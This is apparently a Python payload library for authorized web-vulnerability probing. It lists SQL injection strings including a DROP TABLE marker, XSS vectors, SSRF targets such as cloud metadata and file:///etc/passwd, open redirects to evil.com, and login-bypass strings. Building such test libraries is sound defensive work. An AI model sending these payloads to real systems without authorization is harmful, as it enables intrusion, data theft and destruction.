"""Bounded, reviewable payloads for authorized local validation experiments.

Payloads are advisory inputs only. The existing ScopeLaw, ToolBoundary, M4,
validator, ProofBundle, replay, and promotion authorities remain authoritative.
"""
from __future__ import annotations

from dataclasses import asdict, dataclass
from typing import Iterable


@dataclass(frozen=True)
class PayloadSpec:
    payload_id: str
    family: str
    value: str
    purpose: str
    expected_indicators: tuple[str, ...]
    safety_class: str = "local_authorized_probe"

    def as_dict(self) -> dict[str, object]:
        return asdict(self)


_PAYLOADS: tuple[PayloadSpec, ...] = (
    PayloadSpec("sqli_boolean_or", "SQLI", "' OR 1=1--", "boolean differential", ("status_delta", "body_delta")),
    PayloadSpec("sqli_drop_marker", "SQLI", "'; DROP TABLE--", "non-destructive parser rejection probe", ("safe_rejection",)),
    PayloadSpec("sqli_union_marker", "SQLI", "' UNION SELECT--", "union/error differential", ("sql_error", "status_delta")),
    PayloadSpec("sqli_admin_comment", "SQLI", "admin'--", "authentication query differential", ("status_delta", "auth_state")),
    PayloadSpec("xss_script_marker", "XSS", "webpent_xss_probe_7f1", "benign reflection marker", ("unencoded_reflection",)),
    PayloadSpec("xss_script_tag", "XSS", "<script>alert(1)</script>", "HTML/script reflection context", ("unencoded_reflection",)),
    PayloadSpec("xss_img_marker", "XSS", "<img src=x onerror=alert(1)>", "HTML attribute reflection context", ("unencoded_reflection",)),
    PayloadSpec("xss_javascript_marker", "XSS", "javascript:alert(1)", "URL/attribute reflection context", ("unencoded_reflection",)),
    PayloadSpec("idor_adjacent_id", "IDOR", "1", "adjacent object identifier", ("owner_foreign_control",)),
    PayloadSpec("idor_next_id", "IDOR", "2", "next bounded object identifier", ("owner_foreign_control",)),
    PayloadSpec("idor_invalid_control", "IDOR", "99999999", "invalid negative-control identifier", ("control_404",)),
    PayloadSpec("ssrf_loopback", "SSRF", "http://127.0.0.1", "local loopback reachability probe", ("internal_host",)),
    PayloadSpec("ssrf_metadata", "SSRF", "http://169.254.169.254", "metadata-class reachability probe", ("cloud_metadata",)),
    PayloadSpec("ssrf_file_scheme", "SSRF", "file:///etc/passwd", "scheme rejection probe", ("safe_rejection",)),
    PayloadSpec("redirect_protocol_relative", "OPEN_REDIRECT", "//evil.com", "protocol-relative redirect probe", ("external_location",)),
    PayloadSpec("redirect_absolute", "OPEN_REDIRECT", "https://evil.com", "absolute external redirect probe", ("external_location",)),
    PayloadSpec("redirect_javascript", "OPEN_REDIRECT", "javascript:alert(1)", "unsafe-scheme rejection probe", ("safe_rejection",)),
    PayloadSpec("auth_admin_comment", "AUTH_BYPASS", "admin'--", "bounded login/query bypass probe", ("status_200",)),
    PayloadSpec("auth_boolean", "AUTH_BYPASS", "' OR '1'='1", "bounded boolean bypass probe", ("status_200",)),
    PayloadSpec("auth_header_marker", "AUTH_BYPASS", "bypass", "header/method bypass marker", ("status_200",)),
)


def payloads_for_family(family: str) -> tuple[PayloadSpec, ...]:
    key = str(family or "").upper()
    return tuple(item for item in _PAYLOADS if item.family == key)


def payload_library() -> tuple[PayloadSpec, ...]:
    return _PAYLOADS


def payload_ids_for_families(families: Iterable[str]) -> tuple[str, ...]:
    allowed = {str(item).upper() for item in families}
    return tuple(item.payload_id for item in _PAYLOADS if item.family in allowed)


__all__ = ["PayloadSpec", "payload_library", "payloads_for_family", "payload_ids_for_families"]
